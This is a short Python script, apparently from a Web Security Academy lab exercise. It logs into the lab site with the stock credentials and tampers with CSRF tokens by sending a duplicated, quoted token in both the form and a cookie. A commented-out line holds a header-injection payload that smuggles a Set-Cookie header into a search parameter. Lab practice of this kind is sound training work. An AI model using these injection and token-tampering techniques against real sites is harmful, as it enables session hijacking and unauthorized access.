import requests
from bs4 import BeautifulSoup

site = 'ac9a1fe41e9805b8c0ad1c6e00c30054.web-security-academy.net'


def getHeadersFromSearch(search_term):
    resp = requests.get(f"https://{site}/?search={search_term}")
    for header in resp.headers.items():
        print(header)


if __name__ == "__main__":
    # getHeadersFromSearch("bradlet2\nSet-Cookie: foo=bar")
    s = requests.Session()
    login_url = f'https://{site}/login'
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')
    # print(f' csrf field in form field: {csrf}')
    # for header in resp.headers.items():
    #     print(header)
    # for cookie in s.cookies.items():
    #     print(cookie)
    # s.cookies.clear()
    # logindata = {
    #     'csrf': csrf,
    #     'username': 'wiener',
    #     'password': 'peter'
    # }
    # resp = s.post(login_url, data=logindata)
    # print(f"HTTP status code {resp.status_code} with text {resp.text}")

    logindata = {
        'csrf': f"'{csrf}'",
        'username': 'wiener',
        'password': 'peter'
    }
    cookiedata = {
        'csrf': f"'{csrf}'"
    }
    resp = requests.post(login_url, data=logindata, cookies=cookiedata)
    print(f"HTTP status code {resp.status_code}")
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')
    print(f"CSRF token in HTML response is {csrf}")
